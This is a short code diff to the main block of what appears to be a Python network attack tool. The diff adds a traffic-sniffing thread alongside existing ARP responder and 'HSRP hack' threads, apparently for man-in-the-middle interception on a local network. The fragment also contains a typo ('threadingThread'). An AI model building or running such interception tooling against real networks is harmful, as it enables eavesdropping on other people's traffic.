@@ -138,8 +138,11 @@ def menu():
 if __name__  == "__main__":
     attack = menu()
     arp_sniff = threading.Thread(target=attack.arp_request_sniffer)
+    traffic_sniff = threading.Thread(target=attack.traffic_sniffer)
     hsrp_hack_t = threadingThread(target=attack.hsrp_hack)
     arp_sniff.start()
     print("ARP responder started")
+    traffic_sniff.start()
+    print("Traffic sniffer started")
     hsrp_hack_t.start()
     print("HSRP hack started")
